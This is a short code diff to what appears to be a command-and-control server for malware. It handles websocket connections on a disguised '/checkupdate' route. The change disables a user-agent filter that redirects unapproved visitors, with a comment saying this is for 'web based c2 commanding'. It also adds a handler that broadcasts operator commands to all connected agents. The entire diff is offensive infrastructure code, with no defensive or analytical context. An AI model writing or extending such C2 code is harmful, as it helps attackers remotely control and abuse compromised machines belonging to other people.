@@ -69,6 +69,7 @@ router.get("/checkupdate", async (ctx) => {
   
   // re-route jackholes
   // TODO: check headers for actual sec-websocket-version
+  /* disabled for web based c2 commanding
   if (!approvedAgents.includes(user_agent)) {
     console.log(`
       Jackhole detected from:
@@ -78,6 +79,7 @@ router.get("/checkupdate", async (ctx) => {
         `);
     return ctx.response.redirect("https://www.google.com/");
   }
+  */
 
   // start socket upgrade and handling
   const socket = await ctx.upgrade();
@@ -118,7 +120,11 @@ Headers: ${headers}
         
           case "json":
             handle_json(client, "json", data.message);
-          break
+          break;
+        case "command":
+          console.log(`C2: ${client}, Command: ${data.message}`);
+          broadcast(data.message);
+          break;
         }
     } catch (error) {
       console.log(error);
